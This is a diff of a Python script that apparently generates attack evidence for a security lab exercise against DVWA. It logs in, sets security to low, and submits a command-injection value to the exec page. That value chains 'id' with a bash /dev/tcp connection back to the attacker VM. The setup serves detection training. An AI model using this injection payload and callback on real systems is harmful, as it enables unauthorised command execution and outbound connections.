@@ -6,7 +6,7 @@ Run on the attacker VM after the operator started the exercise (labops.py exerci
 
 Logs in to DVWA, forces security=low, submits a crafted value to /vulnerabilities/exec/ so the web worker runs a shell and
 children beyond `ping`, and makes one outbound connection attempt from the target back to this VM (the network evidence;
-the lab firewall is expected to block it). The User-Agent carries the exercise id, so the Apache request is findable by it.
+the lab firewall is expected to drop it, so the attempt is capped at 5 s). The User-Agent carries the exercise id, so the Apache request is findable by it.
 Writes exercise1-<id>.json (the time window and payload) to the work directory for the hunt notes.
 Lab details come from /etc/opaleye/lab.json (rendered by Ansible from network/plan.json), or --base-url/--attacker-ip.
 """
@@ -48,7 +48,7 @@ class Session:
         _, html = self.get(path)
         m = re.search(r"name=['\"]user_token['\"] value=['\"]([0-9a-f]+)['\"]", html)
         if not m:
-            raise SystemExit("no user_token on %s: is DVWA set up (database created) and reachable?" % path)
+            raise SystemExit("no login user_token on %s: is DVWA set up (database created) and reachable?" % path)
         return m.group(1)
 
     def set_cookie(self, name, value):
@@ -84,13 +84,12 @@ def main(argv):
             base = "http://%s" % lab["targets"][a.target]
     s = Session(base, "opaleye-exercise1/" + a.exercise_id)
 
-    payload = "127.0.0.1; id; bash -c 'echo opaleye-%s > /dev/tcp/%s/%d'" % (a.exercise_id, attacker, port)
+    payload = "127.0.0.1; id; timeout 5 bash -c 'echo opaleye-%s > /dev/tcp/%s/%d'" % (a.exercise_id, attacker, port)
     started = stamp()
     s.post("/login.php", {"username": a.user, "password": a.password, "Login": "Login",
                           "user_token": s.token("/login.php")})
     s.set_cookie("security", "low")
-    _, out = s.post("/vulnerabilities/exec/", {"ip": payload, "Submit": "Submit",
-                                                "user_token": s.token("/vulnerabilities/exec/")})
+    _, out = s.post("/vulnerabilities/exec/", {"ip": payload, "Submit": "Submit"})
     ended = stamp()
     ran = bool(re.search(r"uid=\d+\(", out))
     record = {"exercise_id": a.exercise_id, "target": a.target, "base_url": base, "started": started, "ended": ended,
